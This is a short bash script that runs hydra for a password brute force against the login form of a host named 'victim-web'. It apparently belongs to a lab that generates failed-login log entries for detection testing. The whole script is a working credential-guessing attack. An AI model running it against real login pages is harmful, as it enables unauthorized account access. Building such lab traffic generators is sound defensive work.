#!/usr/bin/env bash
# HTTP POST login brute force against victim-web. Generates "Failed password" web logs.
# Usage: ./attack_web_bruteforce.sh [host] [port] [username]
set -euo pipefail
HOST="${1:-victim-web}"
PORT="${2:-8081}"
USER="${3:-admin}"
WL="/opt/attacks/wordlists/passwords.txt"
echo "[*] Web brute force http://$HOST:$PORT/login as '$USER'"
hydra -l "$USER" -P "$WL" -t 4 -f -V "$HOST" -s "$PORT" \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" || true
echo "[*] Done. The victim-web auth log will show repeated 'Failed password for admin'."
